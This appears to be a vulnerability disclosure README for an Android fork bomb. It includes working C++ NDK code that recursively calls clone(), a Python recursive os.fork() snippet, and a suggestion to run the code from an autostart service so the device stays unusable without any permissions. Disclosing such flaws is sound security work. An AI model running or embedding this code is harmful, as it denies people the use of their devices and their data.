# AndroidForkBomb
[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/02IdLrzgAs0/0.jpg)](https://www.youtube.com/watch?v=02IdLrzgAs0)

I found when I do such code exactly : (the code is in cpp using ndk - JNI ) :
```
  int cloneIt(void * args){
      for (int i = 0 ; i < 1000 ; i ++ ){
          pid_t  pid =  clone(cloneIt,
                              malloc(1),
                              CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID | SIGCHLD ,
                              NULL);
          __android_log_write(ANDROID_LOG_ERROR, "CLONE_ERRNO",
                              ("errno :  " + std::to_string(errno) + "  pid:" + std::to_string(pid )).c_str());
      }

      return 0 ;
  }
```
that function overflows the scheduler and makes the device unusable- it can't be turned off or do anything - use the touch or anything else until the battery dies. I found the bug when I played with python on termux and wrote that code :
```
import os
def cool():
    print(os.fork())
    cool()
cool()
```
so I reversed the sys calls using adb shell in the emulator - I opened termux and used strace and got that (attached file)

I am also attaching poc videos. I think this poc is critical because if someone puts such a function on autostart foreground service - the device and all of its data are worthless - it will just show the login wallpaper without turning off ( and without an option to do anything including turning off the device ). Thanks for the great os - Idan.
Please briefly explain who can exploit the vulnerability, and what they gain when doing so
every developer that have RCE or installed product with that code on the device .

no root privileges
do not require any permissions from the user - can be a method to make all the data unaccessable if the code will be in auto start service without any permissions .![image](https://github.com/user-attachments/assets/bc395092-1883-4d26-b7e3-3df93b7f59bc)


